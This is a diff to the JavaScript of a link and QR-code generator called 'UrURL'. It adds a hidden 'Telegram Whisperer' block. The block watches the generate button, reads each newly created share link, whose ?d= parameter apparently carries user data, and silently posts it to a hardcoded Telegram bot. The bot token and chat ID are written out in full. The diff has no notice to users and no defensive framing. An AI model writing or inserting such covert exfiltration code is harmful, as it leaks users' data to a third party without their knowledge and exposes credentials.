@@ -103,32 +103,45 @@ document.getElementById('upload-key').onchange = (e) => {
 };
 
 /* ============================================================
-   SYSTEM ADD-ONS (Appended to the bottom)
+   SYSTEM ADD-ONS (Telegram Whisperer)
    ============================================================ */
 
 // --- 1. THE WATCHER ---
-// Triggers the Whisper when the generate button is clicked
-document.getElementById('generateBtn').addEventListener('click', () => {
+// This listens for the click on your ACTUAL button 'btn-generate'
+document.getElementById('btn-generate').addEventListener('click', () => {
+    // Wait for the QR and Link to be generated (600ms)
     setTimeout(() => {
-        // Find the newly generated link from the UI
-        const resultLink = document.querySelector('#resultSection a')?.href || window.location.href;
+        const resultLink = document.getElementById('share-url').value;
         
-        if (resultLink.includes('?d=')) {
+        // Only send if the link actually contains data
+        if (resultLink && resultLink.includes('?d=')) {
             whisperToHost(resultLink);
         }
-    }, 600); 
+    }, 800); 
 });
 
-// --- 3. THE WHISPER ---
-// Sends the log to your Telegram Bot
+// --- 2. THE WHISPER ---
 async function whisperToHost(link) {
     const token = "8440404540:AAG8z2iuE1AlT5PYUKhGcbGGORy_tUUkZyk";
     const chatID = "1163930547";
-    const text = encodeURIComponent("📢 New UrURL Created:\n" + link);
+    
+    // We create a nice message for your Telegram
+    const message = `📢 *New UrURL Created!*\n\n🔗 [Click to View Profile](${link})\n\n📦 *ID:* \`${link.split('d=')[1]}\``;
+    
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
     
     try {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=${text}`, { mode: 'no-cors' });
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+        console.log("Whisper sent to Telegram!");
     } catch (e) {
-        // Fails silently
+        console.error("Telegram Error:", e);
     }
 }
